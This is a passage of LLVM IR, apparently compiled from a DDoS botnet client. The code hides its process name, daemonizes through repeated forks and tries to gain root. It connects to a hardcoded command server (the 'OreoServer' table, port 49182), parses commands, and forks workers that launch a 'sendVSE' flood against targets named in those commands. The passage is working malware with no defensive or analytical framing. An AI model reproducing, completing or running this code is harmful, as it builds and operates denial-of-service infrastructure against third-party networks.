  %267 = icmp eq i32 %266, 0
  br i1 %267, label %268, label %340

; <label>:268:                                    ; preds = %.loopexit227
  %269 = icmp slt i32 %0, 6
  br i1 %269, label %.loopexit, label %270

; <label>:270:                                    ; preds = %268
  %271 = getelementptr inbounds i8*, i8** %1, i64 3
  %272 = load i8*, i8** %271, align 8
  %273 = tail call i32 @atoi(i8* %272) #14
  %274 = icmp eq i32 %273, -1
  br i1 %274, label %.loopexit, label %275

; <label>:275:                                    ; preds = %270
  %276 = getelementptr inbounds i8*, i8** %1, i64 2
  %277 = load i8*, i8** %276, align 8
  %278 = tail call i32 @atoi(i8* %277) #14
  %279 = icmp eq i32 %278, -1
  br i1 %279, label %.loopexit, label %280

; <label>:280:                                    ; preds = %275
  %281 = getelementptr inbounds i8*, i8** %1, i64 4
  %282 = load i8*, i8** %281, align 8
  %283 = tail call i32 @atoi(i8* %282) #14
  %284 = icmp eq i32 %283, -1
  br i1 %284, label %.loopexit, label %285

; <label>:285:                                    ; preds = %280
  %286 = getelementptr inbounds i8*, i8** %1, i64 5
  %287 = load i8*, i8** %286, align 8
  %288 = tail call i32 @atoi(i8* %287) #14
  %289 = icmp eq i32 %288, -1
  %290 = icmp sgt i32 %288, 65500
  %291 = or i1 %290, %289
  %292 = icmp sgt i32 %283, 32
  %or.cond210 = or i1 %292, %291
  br i1 %or.cond210, label %.loopexit, label %293

; <label>:293:                                    ; preds = %285
  %294 = icmp eq i32 %0, 7
  br i1 %294, label %295, label %300

; <label>:295:                                    ; preds = %293
  %296 = getelementptr inbounds i8*, i8** %1, i64 6
  %297 = load i8*, i8** %296, align 8
  %298 = tail call i32 @atoi(i8* %297) #14
  %299 = icmp slt i32 %298, 1
  br i1 %299, label %.loopexit, label %300

; <label>:300:                                    ; preds = %295, %293
  %301 = getelementptr inbounds i8*, i8** %1, i64 1
  %302 = load i8*, i8** %301, align 8
  %303 = load i8*, i8** %276, align 8
  %304 = tail call i32 @atoi(i8* %303) #14
  %305 = load i8*, i8** %271, align 8
  %306 = tail call i32 @atoi(i8* %305) #14
  %307 = load i8*, i8** %281, align 8
  %308 = tail call i32 @atoi(i8* %307) #14
  %309 = load i8*, i8** %286, align 8
  %310 = tail call i32 @atoi(i8* %309) #14
  %311 = icmp sgt i32 %0, 6
  br i1 %311, label %312, label %.thread217

; <label>:312:                                    ; preds = %300
  %313 = getelementptr inbounds i8*, i8** %1, i64 6
  %314 = load i8*, i8** %313, align 8
  %315 = tail call i32 @atoi(i8* %314) #14
  %316 = icmp eq i32 %0, 7
  br i1 %316, label %.thread217, label %317

; <label>:317:                                    ; preds = %312
  %318 = getelementptr inbounds i8*, i8** %1, i64 7
  %319 = load i8*, i8** %318, align 8
  %320 = tail call i32 @atoi(i8* %319) #14
  %321 = icmp sgt i32 %0, 8
  br i1 %321, label %322, label %.thread217

; <label>:322:                                    ; preds = %317
  %323 = getelementptr inbounds i8*, i8** %1, i64 8
  %324 = load i8*, i8** %323, align 8
  %325 = tail call i32 @atoi(i8* %324) #14
  br label %.thread217

.thread217:                                       ; preds = %312, %300, %317, %322
  %326 = phi i32 [ %320, %322 ], [ %320, %317 ], [ 1000000, %312 ], [ 1000000, %300 ]
  %327 = phi i32 [ %315, %322 ], [ %315, %317 ], [ %315, %312 ], [ 1000, %300 ]
  %328 = phi i32 [ %325, %322 ], [ 0, %317 ], [ 0, %312 ], [ 0, %300 ]
  %strchr200 = tail call i8* @strchr(i8* %302, i32 44)
  %329 = icmp eq i8* %strchr200, null
  br i1 %329, label %336, label %.preheader222.preheader

.preheader222.preheader:                          ; preds = %.thread217
  br label %.preheader222

.preheader222:                                    ; preds = %.preheader222.preheader, %332
  %.sink211 = phi i8* [ null, %332 ], [ %302, %.preheader222.preheader ]
  %330 = tail call i8* @strtok(i8* %.sink211, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i64 0, i64 0)) #3
  %331 = icmp eq i8* %330, null
  br i1 %331, label %.loopexit.loopexit262, label %332

; <label>:332:                                    ; preds = %.preheader222
  %333 = tail call i32 @listFork()
  %334 = icmp eq i32 %333, 0
  br i1 %334, label %335, label %.preheader222

; <label>:335:                                    ; preds = %332
  tail call void @sendVSE(i8* nonnull %330, i32 %304, i32 %306, i32 %308, i32 %310, i32 %327, i32 %326, i32 %328)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:336:                                    ; preds = %.thread217
  %337 = tail call i32 @listFork()
  %338 = icmp eq i32 %337, 0
  br i1 %338, label %339, label %.loopexit

; <label>:339:                                    ; preds = %336
  tail call void @sendVSE(i8* %302, i32 %304, i32 %306, i32 %308, i32 %310, i32 %327, i32 %326, i32 %328)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:340:                                    ; preds = %.loopexit227
  %341 = tail call i32 @strcmp(i8* %265, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.108, i64 0, i64 0)) #14
  %342 = icmp eq i32 %341, 0
  %343 = load i64, i64* @numpids, align 8
  %344 = icmp ne i64 %343, 0
  %or.cond = and i1 %342, %344
  br i1 %or.cond, label %.lr.ph234.preheader, label %.loopexit

.lr.ph234.preheader:                              ; preds = %340
  br label %.lr.ph234

.lr.ph234:                                        ; preds = %.lr.ph234.preheader, %357
  %.0233 = phi i64 [ %358, %357 ], [ 0, %.lr.ph234.preheader ]
  %345 = load i32*, i32** @pids, align 8
  %346 = getelementptr inbounds i32, i32* %345, i64 %.0233
  %347 = load i32, i32* %346, align 4
  %348 = icmp eq i32 %347, 0
  br i1 %348, label %357, label %349

; <label>:349:                                    ; preds = %.lr.ph234
  %350 = tail call i32 @getpid() #3
  %351 = icmp eq i32 %347, %350
  br i1 %351, label %357, label %352

; <label>:352:                                    ; preds = %349
  %353 = load i32*, i32** @pids, align 8
  %354 = getelementptr inbounds i32, i32* %353, i64 %.0233
  %355 = load i32, i32* %354, align 4
  %356 = tail call i32 @kill(i32 %355, i32 9) #3
  br label %357

; <label>:357:                                    ; preds = %349, %.lr.ph234, %352
  %358 = add i64 %.0233, 1
  %359 = load i64, i64* @numpids, align 8
  %360 = icmp ult i64 %358, %359
  br i1 %360, label %.lr.ph234, label %.loopexit.loopexit263

.loopexit.loopexit:                               ; preds = %.preheader
  br label %.loopexit

.loopexit.loopexit260:                            ; preds = %.preheader218
  br label %.loopexit

.loopexit.loopexit261:                            ; preds = %.lr.ph
  br label %.loopexit

.loopexit.loopexit262:                            ; preds = %.preheader222
  br label %.loopexit

.loopexit.loopexit263:                            ; preds = %357
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit263, %.loopexit.loopexit262, %.loopexit.loopexit261, %.loopexit.loopexit260, %.loopexit.loopexit, %.preheader220, %340, %336, %261, %222, %187, %143, %74, %268, %270, %275, %280, %285, %295, %230, %206, %208, %213, %175, %177, %182, %171, %150, %152, %157, %81, %83, %88, %93, %101, %108, %6, %8, %13, %18, %23, %33
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #1 {
  %1 = alloca [512 x i8], align 16
  %2 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 512, i32 16, i1 false)
  %3 = load i32, i32* @mainCommSock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #3
  store i32 0, i32* @mainCommSock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @currentServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %8, 0
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @currentServer, align 4
  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [1 x i8*], [1 x i8*]* @OreoServer, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strcpy(i8* nonnull %2, i8* %13) #3
  %15 = call i8* @strchr(i8* nonnull %2, i32 58) #14
  %16 = icmp eq i8* %15, null
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %7
  %18 = getelementptr inbounds i8, i8* %15, i64 1
  %19 = call i32 @atoi(i8* %18) #14
  store i8 0, i8* %15, align 1
  br label %20

; <label>:20:                                     ; preds = %7, %17
  %.0 = phi i32 [ %19, %17 ], [ 49182, %7 ]
  %21 = call i32 @socket(i32 2, i32 1, i32 0) #3
  store i32 %21, i32* @mainCommSock, align 4
  %22 = call i32 @connectTimeout(i32 %21, i8* nonnull %2, i32 %.0, i32 30)
  %23 = icmp eq i32 %22, 0
  %. = zext i1 %23 to i32
  ret i32 %.
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() local_unnamed_addr #1 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca %struct.ifreq, align 8
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #3
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %46, label %8

; <label>:8:                                      ; preds = %0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 3, i64 0
  %10 = bitcast i8* %9 to i64*
  store i64 0, i64* %10, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.109, i64 0, i64 0)) #3
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %12, i32* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 53) #17
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %17 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %16, i32 16) #3
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %46, label %19

; <label>:19:                                     ; preds = %8
  store i32 16, i32* %3, align 4
  %20 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %21 = call i32 @getsockname(i32 %6, %struct.sockaddr* nonnull %20, i32* nonnull %3) #3
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %46, label %23

; <label>:23:                                     ; preds = %19
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %25 = load i32, i32* %24, align 4
  store i32 %25, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %26 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.110, i64 0, i64 0), i32 0) #3
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %28 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %29 = icmp eq i8* %28, null
  br i1 %29, label %.loopexit17, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %23
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %36
  %30 = call i8* @strstr(i8* nonnull %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.111, i64 0, i64 0)) #14
  %31 = icmp eq i8* %30, null
  br i1 %31, label %36, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.015 = phi i8* [ %34, %.preheader ], [ %27, %.preheader.preheader ]
  %32 = load i8, i8* %.015, align 1
  %33 = icmp eq i8 %32, 9
  %34 = getelementptr inbounds i8, i8* %.015, i64 1
  br i1 %33, label %35, label %.preheader

; <label>:35:                                     ; preds = %.preheader
  store i8 0, i8* %.015, align 1
  br label %.loopexit17

; <label>:36:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %27, i8 0, i64 4096, i32 16, i1 false)
  %37 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit17.loopexit, label %.lr.ph

.loopexit17.loopexit:                             ; preds = %36
  br label %.loopexit17

.loopexit17:                                      ; preds = %.loopexit17.loopexit, %23, %35
  %39 = call i32 @close(i32 %26) #3
  %40 = load i8, i8* %27, align 16
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %.loopexit, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.loopexit17
  %42 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 0, i32 0, i64 0
  %43 = call i8* @strcpy(i8* nonnull %42, i8* nonnull %27) #3
  %44 = call i32 (i32, i64, ...) @ioctl(i32 %6, i64 35111, %struct.ifreq* nonnull %5) #3
  %scevgep = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 1, i32 0, i32 0
  %scevgep20 = bitcast i64* %scevgep to i8*
  %uglygep = getelementptr inbounds i8, i8* %scevgep20, i64 2
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), i8* %uglygep, i64 6, i32 1, i1 false)
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit17
  %45 = call i32 @close(i32 %6) #3
  br label %46

; <label>:46:                                     ; preds = %19, %8, %0, %.loopexit
  ret i32 0
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8** nocapture) local_unnamed_addr #1 {
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca [10 x i8*], align 16
  %6 = load i8*, i8** %1, align 8
  %7 = tail call i64 @strlen(i8* %6) #14
  tail call void @llvm.memset.p0i8.i64(i8* %6, i8 0, i64 %7, i32 1, i1 false)
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.80, i64 0, i64 0), i8** %1, align 8
  %8 = tail call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 ptrtoint ([1 x i8]* @.str.80 to i64), i32 0, i32 0, i32 0) #3
  %9 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %10 = tail call i32 @getpid() #3
  %11 = xor i32 %10, %9
  tail call void @srand(i32 %11) #3
  %12 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %13 = tail call i32 @getpid() #3
  %14 = xor i32 %13, %12
  tail call void @init_rand(i32 %14)
  %15 = tail call i32 @fork() #3
  %16 = icmp eq i32 %15, 0
  br i1 %16, label %19, label %17

; <label>:17:                                     ; preds = %2
  %18 = call i32 @waitpid(i32 %15, i32* nonnull %3, i32 0) #3
  call void @exit(i32 0) #16
  unreachable

; <label>:19:                                     ; preds = %2
  %20 = tail call i32 @fork() #3
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %23, label %22

; <label>:22:                                     ; preds = %19
  tail call void @exit(i32 0) #16
  unreachable

; <label>:23:                                     ; preds = %19
  %24 = tail call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.112, i64 0, i64 0)) #3
  %25 = tail call i32 @setuid(i32 0) #3
  %26 = tail call i32 @seteuid(i32 0) #3
  %27 = tail call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #3
  %28 = tail call i32 @fork() #3
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %.lr.ph107.preheader, label %.loopexit78

.lr.ph107.preheader:                              ; preds = %23
  br label %.lr.ph107

.lr.ph107:                                        ; preds = %.lr.ph107.preheader, %32
  %30 = tail call i32 @initConnection()
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %36, label %32

; <label>:32:                                     ; preds = %.lr.ph107
  %33 = tail call i32 @sleep(i32 5) #3
  %34 = tail call i32 @fork() #3
  %35 = icmp eq i32 %34, 0
  br i1 %35, label %.lr.ph107, label %.loopexit78.loopexit128

; <label>:36:                                     ; preds = %.lr.ph107
  %37 = load i32, i32* @mainCommSock, align 4
  %38 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %39 = tail call i8* @inet_ntoa(i32 %38) #3
  %40 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %37, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.113, i64 0, i64 0), i8* %39, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.114, i64 0, i64 0))
  tail call void @ioctl_keepalive()
  %41 = load i32, i32* @mainCommSock, align 4
  %42 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %43 = call i32 @recvLine(i32 %41, i8* nonnull %42, i32 4096)
  %44 = icmp eq i32 %43, -1
  br i1 %44, label %.loopexit78, label %.preheader77.lr.ph

.preheader77.lr.ph:                               ; preds = %36
  %45 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 1
  %46 = getelementptr inbounds [10 x i8*], [10 x i8*]* %5, i64 0, i64 0
  br label %.preheader77

.preheader77:                                     ; preds = %.preheader77.lr.ph, %.backedge
  %47 = phi i32 [ %43, %.preheader77.lr.ph ], [ %99, %.backedge ]
  %48 = load i64, i64* @numpids, align 8
  %49 = icmp eq i64 %48, 0
  br i1 %49, label %._crit_edge93, label %.lr.ph92.preheader

.lr.ph92.preheader:                               ; preds = %.preheader77
  br label %.lr.ph92

.lr.ph92:                                         ; preds = %.lr.ph92.preheader, %92
  %indvars.iv = phi i64 [ %indvars.iv.next, %92 ], [ 0, %.lr.ph92.preheader ]
  %50 = load i32*, i32** @pids, align 8
  %51 = getelementptr inbounds i32, i32* %50, i64 %indvars.iv
  %52 = load i32, i32* %51, align 4
  %53 = call i32 @waitpid(i32 %52, i32* null, i32 1) #3
  %54 = icmp sgt i32 %53, 0
  br i1 %54, label %.preheader, label %92

.preheader:                                       ; preds = %.lr.ph92
  %55 = add nuw i64 %indvars.iv, 1
  %56 = load i64, i64* @numpids, align 8
  %57 = icmp ult i64 %55, %56
  %58 = load i32*, i32** @pids, align 8
  %59 = trunc i64 %indvars.iv to i32
  br i1 %57, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %60 = trunc i64 %55 to i32
  %61 = trunc i64 %indvars.iv to i32
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %62 = phi i32* [ %71, %.lr.ph ], [ %58, %.lr.ph.preheader ]
  %63 = phi i64 [ %68, %.lr.ph ], [ %55, %.lr.ph.preheader ]
  %.06584 = phi i32 [ %.065, %.lr.ph ], [ %60, %.lr.ph.preheader ]
  %.065.in83 = phi i32 [ %.06584, %.lr.ph ], [ %61, %.lr.ph.preheader ]
  %64 = getelementptr inbounds i32, i32* %62, i64 %63
  %65 = load i32, i32* %64, align 4
  %66 = zext i32 %.065.in83 to i64
  %67 = getelementptr inbounds i32, i32* %62, i64 %66
  store i32 %65, i32* %67, align 4
  %.065 = add i32 %.06584, 1
  %68 = zext i32 %.065 to i64
  %69 = load i64, i64* @numpids, align 8
  %70 = icmp ult i64 %68, %69
  %71 = load i32*, i32** @pids, align 8
  br i1 %70, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.065.in.lcssa = phi i32 [ %59, %.preheader ], [ %.06584, %._crit_edge.loopexit ]
  %.lcssa = phi i32* [ %58, %.preheader ], [ %71, %._crit_edge.loopexit ]
  %72 = zext i32 %.065.in.lcssa to i64
  %73 = getelementptr inbounds i32, i32* %.lcssa, i64 %72
  store i32 0, i32* %73, align 4
  %74 = load i64, i64* @numpids, align 8
  %75 = add i64 %74, -1
  store i64 %75, i64* @numpids, align 8
  %76 = shl i64 %74, 2
  %77 = call noalias i8* @malloc(i64 %76) #3
  %78 = bitcast i8* %77 to i32*
  %79 = icmp eq i64 %75, 0
  %80 = load i32*, i32** @pids, align 8
  br i1 %79, label %._crit_edge89, label %.lr.ph88.preheader

.lr.ph88.preheader:                               ; preds = %._crit_edge
  br label %.lr.ph88

.lr.ph88:                                         ; preds = %.lr.ph88.preheader, %.lr.ph88
  %81 = phi i32* [ %90, %.lr.ph88 ], [ %80, %.lr.ph88.preheader ]
  %82 = phi i64 [ %87, %.lr.ph88 ], [ 0, %.lr.ph88.preheader ]
  %.16686 = phi i32 [ %86, %.lr.ph88 ], [ 0, %.lr.ph88.preheader ]
  %83 = getelementptr inbounds i32, i32* %81, i64 %82
  %84 = load i32, i32* %83, align 4
  %85 = getelementptr inbounds i32, i32* %78, i64 %82
  store i32 %84, i32* %85, align 4
  %86 = add i32 %.16686, 1
  %87 = zext i32 %86 to i64
  %88 = load i64, i64* @numpids, align 8
  %89 = icmp ult i64 %87, %88
  %90 = load i32*, i32** @pids, align 8
  br i1 %89, label %.lr.ph88, label %._crit_edge89.loopexit

._crit_edge89.loopexit:                           ; preds = %.lr.ph88
  br label %._crit_edge89

._crit_edge89:                                    ; preds = %._crit_edge89.loopexit, %._crit_edge
  %.lcssa80 = phi i32* [ %80, %._crit_edge ], [ %90, %._crit_edge89.loopexit ]
  %91 = bitcast i32* %.lcssa80 to i8*
  call void @free(i8* %91) #3
  store i8* %77, i8** bitcast (i32** @pids to i8**), align 8
  br label %92

; <label>:92:                                     ; preds = %.lr.ph92, %._crit_edge89
  %indvars.iv.next = add nuw i64 %indvars.iv, 1
  %sext = shl i64 %indvars.iv.next, 32
  %93 = ashr exact i64 %sext, 32
  %94 = load i64, i64* @numpids, align 8
  %95 = icmp ult i64 %93, %94
  br i1 %95, label %.lr.ph92, label %._crit_edge93.loopexit

._crit_edge93.loopexit:                           ; preds = %92
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %._crit_edge93.loopexit, %.preheader77
  %96 = sext i32 %47 to i64
  %97 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %96
  store i8 0, i8* %97, align 1
  call void @trim(i8* nonnull %42)
  %strncmp = call i32 @strncmp(i8* nonnull %42, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0), i64 4)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %.backedge, label %101

.backedge.loopexit:                               ; preds = %.lr.ph105
  br label %.backedge

.backedge.loopexit127:                            ; preds = %.preheader108
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit127, %.backedge.loopexit, %._crit_edge102.thread, %._crit_edge93, %._crit_edge102, %103
  %98 = load i32, i32* @mainCommSock, align 4
  %99 = call i32 @recvLine(i32 %98, i8* nonnull %42, i32 4096)
  %100 = icmp eq i32 %99, -1
  br i1 %100, label %.loopexit78.loopexit, label %.preheader77

; <label>:101:                                    ; preds = %._crit_edge93
  %strncmp69 = call i32 @strncmp(i8* nonnull %42, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.115, i64 0, i64 0), i64 3)
  %cmp70 = icmp eq i32 %strncmp69, 0
  br i1 %cmp70, label %102, label %103

; <label>:102:                                    ; preds = %101
  call void @exit(i32 0) #16
  unreachable

; <label>:103:                                    ; preds = %101
  %104 = load i8, i8* %42, align 16
  %105 = icmp eq i8 %104, 33
  br i1 %105, label %.preheader108.preheader, label %.backedge

.preheader108.preheader:                          ; preds = %103
  br label %.preheader108

.preheader108:                                    ; preds = %.preheader108.preheader, %107
  %.063 = phi i8* [ %108, %107 ], [ %45, %.preheader108.preheader ]
  %106 = load i8, i8* %.063, align 1
  switch i8 %106, label %107 [
    i8 0, label %.backedge.loopexit127
    i8 32, label %109
  ]

; <label>:107:                                    ; preds = %.preheader108
  %108 = getelementptr inbounds i8, i8* %.063, i64 1
  br label %.preheader108

; <label>:109:                                    ; preds = %.preheader108
  store i8 0, i8* %.063, align 1
  %110 = call i64 @strlen(i8* %45) #14
  %111 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %110
  %112 = getelementptr inbounds i8, i8* %111, i64 2
  br label %113

; <label>:113:                                    ; preds = %118, %109
  %114 = call i64 @strlen(i8* %112) #14
  %115 = add i64 %114, -1
  %116 = getelementptr inbounds i8, i8* %112, i64 %115
  %117 = load i8, i8* %116, align 1
  switch i8 %117, label %.preheader75.preheader [
    i8 13, label %118
    i8 10, label %118
  ]

.preheader75.preheader:                           ; preds = %113
  br label %.preheader75

; <label>:118:                                    ; preds = %113, %113
  store i8 0, i8* %116, align 1
  br label %113

.preheader75:                                     ; preds = %.preheader75.preheader, %120
  %.064 = phi i8* [ %121, %120 ], [ %112, %.preheader75.preheader ]
  %119 = load i8, i8* %.064, align 1
  switch i8 %119, label %120 [
    i8 32, label %122
    i8 0, label %122
  ]

; <label>:120:                                    ; preds = %.preheader75
  %121 = getelementptr inbounds i8, i8* %.064, i64 1
  br label %.preheader75

; <label>:122:                                    ; preds = %.preheader75, %.preheader75
  store i8 0, i8* %.064, align 1
  %123 = getelementptr inbounds i8, i8* %.064, i64 1
  %124 = load i8, i8* %112, align 1
  %125 = icmp eq i8 %124, 0
  br i1 %125, label %._crit_edge97, label %.lr.ph96.preheader

.lr.ph96.preheader:                               ; preds = %122
  br label %.lr.ph96

.lr.ph96:                                         ; preds = %.lr.ph96.preheader, %.lr.ph96
  %126 = phi i8 [ %131, %.lr.ph96 ], [ %124, %.lr.ph96.preheader ]
  %.06294 = phi i8* [ %130, %.lr.ph96 ], [ %112, %.lr.ph96.preheader ]
  %127 = zext i8 %126 to i32
  %128 = call i32 @toupper(i32 %127) #14
  %129 = trunc i32 %128 to i8
  store i8 %129, i8* %.06294, align 1
  %130 = getelementptr inbounds i8, i8* %.06294, i64 1
  %131 = load i8, i8* %130, align 1
  %132 = icmp eq i8 %131, 0
  br i1 %132, label %._crit_edge97.loopexit, label %.lr.ph96

._crit_edge97.loopexit:                           ; preds = %.lr.ph96
  br label %._crit_edge97

._crit_edge97:                                    ; preds = %._crit_edge97.loopexit, %122
  %133 = call i8* @strtok(i8* %123, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i64 0, i64 0)) #3
  store i8* %112, i8** %46, align 16
  %134 = icmp eq i8* %133, null
  br i1 %134, label %._crit_edge102.thread, label %.lr.ph101.preheader

.lr.ph101.preheader:                              ; preds = %._crit_edge97
  br label %.lr.ph101

._crit_edge102.thread:                            ; preds = %._crit_edge97
  call void @processCmd(i32 1, i8** nonnull %46)
  br label %.backedge

.lr.ph101:                                        ; preds = %.lr.ph101.preheader, %147
  %.06099 = phi i8* [ %148, %147 ], [ %133, %.lr.ph101.preheader ]
  %.06198 = phi i32 [ %.1, %147 ], [ 1, %.lr.ph101.preheader ]
  %135 = load i8, i8* %.06099, align 1
  %136 = icmp eq i8 %135, 10
  br i1 %136, label %147, label %137

; <label>:137:                                    ; preds = %.lr.ph101
  %138 = call i64 @strlen(i8* nonnull %.06099) #14
  %139 = add i64 %138, 1
  %140 = call noalias i8* @malloc(i64 %139) #3
  %141 = sext i32 %.06198 to i64
  %142 = getelementptr inbounds [10 x i8*], [10 x i8*]* %5, i64 0, i64 %141
  store i8* %140, i8** %142, align 8
  %143 = call i64 @strlen(i8* nonnull %.06099) #14
  %144 = add i64 %143, 1
  call void @llvm.memset.p0i8.i64(i8* %140, i8 0, i64 %144, i32 1, i1 false)
  %145 = call i8* @strcpy(i8* %140, i8* nonnull %.06099) #3
  %146 = add nsw i32 %.06198, 1
  br label %147

; <label>:147:                                    ; preds = %.lr.ph101, %137
  %.1 = phi i32 [ %146, %137 ], [ %.06198, %.lr.ph101 ]
  %148 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i64 0, i64 0)) #3
  %149 = icmp eq i8* %148, null
  br i1 %149, label %._crit_edge102, label %.lr.ph101

._crit_edge102:                                   ; preds = %147
  call void @processCmd(i32 %.1, i8** nonnull %46)
  %150 = icmp sgt i32 %.1, 1
  br i1 %150, label %.lr.ph105.preheader, label %.backedge

.lr.ph105.preheader:                              ; preds = %._crit_edge102
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph105

.lr.ph105:                                        ; preds = %.lr.ph105.preheader, %.lr.ph105
  %indvars.iv115 = phi i64 [ %indvars.iv.next116, %.lr.ph105 ], [ 1, %.lr.ph105.preheader ]
  %151 = getelementptr inbounds [10 x i8*], [10 x i8*]* %5, i64 0, i64 %indvars.iv115
  %152 = load i8*, i8** %151, align 8
  call void @free(i8* %152) #3
  %indvars.iv.next116 = add nuw nsw i64 %indvars.iv115, 1
  %exitcond = icmp eq i64 %indvars.iv.next116, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph105

.loopexit78.loopexit:                             ; preds = %.backedge
  br label %.loopexit78

.loopexit78.loopexit128:                          ; preds = %32
  br label %.loopexit78

